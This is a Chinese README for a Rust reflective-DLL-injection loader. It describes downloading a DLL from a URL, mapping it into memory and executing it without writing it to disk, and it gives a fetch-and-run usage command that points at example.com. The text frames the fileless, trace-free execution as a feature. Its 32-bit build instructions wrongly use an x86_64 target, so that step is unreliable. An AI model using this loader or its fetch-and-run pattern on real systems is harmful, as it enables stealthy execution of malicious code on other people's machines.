# Rust RDI Loader - 反射式DLL注入工具 (Rust版本)

一个使用 Rust 实现的反射式DLL注入（Reflective DLL Injection）工具，支持从远程URL下载DLL并在内存中执行，无需文件落地。

## ⚠️ 免责声明

**此工具仅应用于以下合法目的：**
- ✅ 授权的渗透测试和安全评估
- ✅ CTF竞赛和安全研究
- ✅ 教育和学习目的
- ✅ 防御性安全研究

**未经授权使用此工具进行恶意活动是违法的。**

## ✨ 特性

- 🌐 **远程下载** - 从URL获取DLL文件
- 🔍 **PE解析** - 完整解析PE文件格式
- 💾 **内存加载** - 直接在内存中加载和执行
- 🔧 **导入表修复** - 自动解析API依赖
- 📍 **重定位处理** - 自动修正地址差异
- ✅ **完全无文件** - 不在磁盘留下任何痕迹
- 🛡️ **错误处理** - 详细的错误信息和诊断
- 🦀 **Rust实现** - 内存安全，更小体积

## 📋 系统要求

- **操作系统**: Windows 7 或更高版本
- **架构**: x64
- **Rust**: 1.70 或更高版本
- **依赖**: WinHTTP (系统自带)

## 🚀 快速开始

### 安装 Rust

```bash
# 下载并安装 rustup
# https://rustup.rs/

# 或使用 winget
winget install Rustlang.Rustup
```

### 编译

```bash
cd rust-rdi

# Debug 版本
cargo build

# Release 版本 (推荐)
cargo build --release
```

编译后的可执行文件位于：
- `target/debug/rust-rdi.exe` (Debug)
- `target/release/rust-rdi.exe` (Release)

### 使用

```bash
# 方式1：命令行参数
target\release\rust-rdi.exe http://example.com/test.dll

# 方式2：交互式输入
target\release\rust-rdi.exe
# 然后输入URL
```

## 📁 项目结构

```
rust-rdi/
├── src/
│   ├── main.rs        # 主程序和DLL执行
│   ├── downloader.rs  # HTTP下载模块
│   ├── pe.rs          # PE文件解析模块
│   └── loader.rs      # 内存加载器模块
├── Cargo.toml         # 项目配置
└── README.md          # 本文件
```

## 🔧 技术实现

### 核心模块

1. **HTTP下载模块 (downloader.rs)**
   - 使用 WinHTTP API
   - 支持HTTP/HTTPS
   - 错误处理和超时
   - 支持自定义端口

2. **PE解析模块 (pe.rs)**
   - DOS头和NT头验证
   - 节区头解析
   - 架构验证（x64/x86）
   - 数据目录解析

3. **内存加载模块 (loader.rs)**
   - VirtualAlloc内存分配
   - 节区加载和映射
   - 导入表解析和修复
   - 基址重定位
   - 内存保护修正

4. **主程序 (main.rs)**
   - 命令行参数处理
   - 交互式URL输入
   - DLL入口点调用
   - 错误处理

### 相比C++版本的优势

1. **内存安全**: Rust的所有权系统防止内存错误
2. **更小体积**: Release编译后约 100-200KB
3. **零成本抽象**: 高级特性不影响性能
4. **模式匹配**: 更强大的错误处理

### 支持的DLL类型

✅ **支持：**
- 标准PE/PE+格式
- x64 DLL（当前加载器为64位）
- 标准导入表
- 基址重定位

❌ **不支持：**
- 32位DLL（需要32位加载器）
- .NET程序集
- 加壳/压缩DLL
- 延迟加载导入

### 大小限制

| 项目 | 限制 |
|------|------|
| URL长度 | 2048字符 |
| DLL大小 | 推荐 < 50MB |
| 最大大小 | 500MB |

## 📊 编译输出

```
文件: target/release/rust-rdi.exe
大小: 约100-200KB (strip后)
依赖: 仅系统DLL (kernel32.dll, winhttp.dll等)
特点: 静态链接，独立运行
```

## 📝 示例输出

```
=== RDI (Reflective DLL Injection) Loader - Rust Version ===
警告：此工具仅应用于授权的安全测试和研究

URL from command line: http://example.com/test.dll

正在下载DLL...
[*] Parsed URL - Host: example.com, Port: 80, Path: /test.dll
[+] Downloaded 102400 bytes

[*] Starting PE parsing...
[+] DOS header valid
[+] NT header valid
[+] Architecture matches
[*] Image Base: 0x180000000

正在加载DLL到内存...
[*] Image Size: 196608 bytes
[+] Allocated 196608 bytes at 0x7FF123450000
[+] Headers copied

[*] Loading sections...
[+] Loaded section: .text
[+] Loaded section: .data

[*] Processing import table...
[*] Loading library: KERNEL32.dll
[+] Resolved 45 functions from 2 libraries
[*] Applying relocations (delta: 0x7F123450000)...
[+] Relocations applied

DLL加载成功!

正在执行DLL...
Entry point: 0x7FF123451000
DLL执行成功!

按Enter键退出...
```

## 🛠️ 开发

### 依赖说明

- `windows` crate: Windows API 绑定
- `url` crate: URL 解析 (备用)

### 编译选项

```toml
[profile.release]
strip = true           # 去除符号信息
opt-level = "z"        # 优化体积
lto = true            # 链接时优化
codegen-units = 1     # 单编译单元优化
panic = "abort"       # 减小体积
```

### 交叉编译

如需32位版本：
```bash
rustup target add x86_64-pc-windows-msvc
cargo build --release --target x86_64-pc-windows-msvc
```

## 🔒 安全性

- ✅ **无文件落地** - 全程内存操作
- ⚠️ **会被检测** - 安全软件会检测为可疑行为
- ⚠️ **RWX内存** - 可执行+可写内存违反DEP原则
- ✅ **仅合法用途** - 授权测试和学习

## 🤝 贡献

本项目仅用于教育目的。欢迎提出建议和改进。

## 📄 许可证

仅供教育和合法安全研究使用。作者不对滥用造成的任何损害负责。

---

**⚠️ 重要提醒：合法使用，后果自负！**
